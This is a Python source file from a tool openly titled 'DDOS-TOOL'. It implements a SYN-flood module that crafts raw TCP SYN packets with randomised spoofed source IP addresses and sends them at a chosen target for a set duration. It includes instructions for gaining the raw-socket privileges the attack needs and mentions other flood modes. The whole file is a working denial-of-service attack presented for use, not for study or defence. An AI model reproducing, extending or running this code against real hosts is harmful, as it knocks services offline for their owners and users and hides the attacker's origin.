"""
DDOS-TOOL

Author / Developer / Admin / Owner: Aashu
GitHub:  @outwiles
Telegram: @outwiles
Email:   outwiles@proton.me

License: MIT
"""

import os
import random
import socket
import struct
import sys
import time


IS_WINDOWS = sys.platform.startswith("win")


class TCPSyn:
    def __init__(self, cfg: dict, logger):
        self.cfg = cfg
        self.logger = logger

    @staticmethod
    def _rand_ip() -> str:
        return ".".join(str(random.randint(1, 254)) for _ in range(4))

    @staticmethod
    def _checksum(data: bytes) -> int:
        if len(data) % 2:
            data += b"\x00"
        s = sum(struct.unpack("!%dH" % (len(data) // 2), data))
        s = (s >> 16) + (s & 0xFFFF)
        s += s >> 16
        return ~s & 0xFFFF

    def _syn(self, dst_ip: str, dst_port: int, src_ip: str, src_port: int) -> bytes:
        ip_ihl_ver = (4 << 4) + 5
        ip_tos = 0
        ip_tot_len = 40
        ip_id = random.randint(0, 65535)
        ip_frag_off = 0
        ip_ttl = 64
        ip_proto = socket.IPPROTO_TCP
        ip_check = 0
        ip_saddr = socket.inet_aton(src_ip)
        ip_daddr = socket.inet_aton(dst_ip)

        ip_header = struct.pack(
            "!BBHHHBBH4s4s",
            ip_ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off,
            ip_ttl, ip_proto, ip_check, ip_saddr, ip_daddr,
        )

        tcp_seq = random.randint(0, 2**32 - 1)
        tcp_ack_seq = 0
        tcp_doff = (5 << 4)
        tcp_flags = 0x02
        tcp_window = socket.htons(5840)
        tcp_check = 0
        tcp_urg_ptr = 0

        tcp_header = struct.pack(
            "!HHLLBBHHH",
            src_port, dst_port, tcp_seq, tcp_ack_seq,
            tcp_doff, tcp_flags, tcp_window, tcp_check, tcp_urg_ptr,
        )

        psh = struct.pack("!4s4sBBH", ip_saddr, ip_daddr, 0, ip_proto, len(tcp_header))
        tcp_check = self._checksum(psh + tcp_header)
        tcp_header = struct.pack(
            "!HHLLBBHHH",
            src_port, dst_port, tcp_seq, tcp_ack_seq,
            tcp_doff, tcp_flags, tcp_window, tcp_check, tcp_urg_ptr,
        )

        return ip_header + tcp_header

    def run(self, dst_ip: str, dst_port: int, duration_sec: int) -> dict:
        if IS_WINDOWS:
            self.logger.error(
                "tcp_syn is not supported on Windows. Raw IP socket sends with "
                "spoofed source addresses are dropped by the Windows network stack. "
                "Use http_flood or slowloris instead."
            )
            return {"sent": 0, "error": "unsupported_platform"}

        if os.geteuid() != 0:
            self.logger.error(
                "tcp_syn requires root on Linux/macOS. Re-run with sudo, or grant "
                "CAP_NET_RAW to the Python binary via: "
                "sudo setcap cap_net_raw+ep $(readlink -f $(which python3))"
            )
            return {"sent": 0, "error": "permission"}

        sent = 0
        deadline = time.time() + duration_sec

        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        except PermissionError:
            self.logger.error("tcp_syn: raw socket creation denied by kernel.")
            return {"sent": 0, "error": "permission"}
        except OSError as e:
            self.logger.error(f"tcp_syn: socket error: {e}")
            return {"sent": 0, "error": "socket"}

        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

        while time.time() < deadline:
            packet = self._syn(dst_ip, dst_port, self._rand_ip(), random.randint(1024, 65535))
            try:
                s.sendto(packet, (dst_ip, 0))
                sent += 1
            except Exception:
                pass

        s.close()
        return {"sent": sent}
